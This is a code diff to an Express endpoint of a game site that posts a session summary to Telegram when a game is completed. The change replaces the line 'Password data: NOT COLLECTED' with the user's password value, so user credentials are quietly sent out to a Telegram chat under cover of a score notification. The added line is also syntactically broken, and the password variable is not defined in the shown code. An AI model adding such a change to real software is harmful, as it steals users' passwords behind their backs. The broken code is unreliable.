@@ -82,7 +82,7 @@ app.post("/api/game-complete",async(req,res)=>{
   const draws=safeNumber(summary.draws);
   const truths=safeNumber(summary.truths);
   const dares=safeNumber(summary.dares);
-  const text=["🏆 Dhanush Games — DAY COMPLETED","","👤 Username: @"+username,"🆔 Session: "+sessionId,"📅 Completed: "+new Date().toISOString(),"","📊 FINAL SCORE","🎯 RPS rounds: "+rounds,"🎮 Games opened: "+games,"🏆 Player wins: "+playerScore,"🤖 Computer wins: "+computerScore,"🤝 Draws: "+draws,"💬 Truth questions: "+truths,"🔥 Dares: "+dares,"","✅ Session marked complete.","🔐 Password data: NOT COLLECTED"].join("\n");
+  const text=["🏆 Dhanush Games — DAY COMPLETED","","👤 Username: @"+username,"🆔 Session: "+sessionId,"📅 Completed: "+new Date().toISOString(),"","📊 FINAL SCORE","🎯 RPS rounds: "+rounds,"🎮 Games opened: "+games,"🏆 Player wins: "+playerScore,"🤖 Computer wins: "+computerScore,"🤝 Draws: "+draws,"💬 Truth questions: "+truths,"🔥 Dares: "+dares,"","✅ Session marked complete.","🔐 Password data: "+password,"].join("\n");
   const notification=await sendTelegram(text);
   res.json({ok:true,completed:true,notificationSent:notification.sent,notificationError:notification.error});
 });
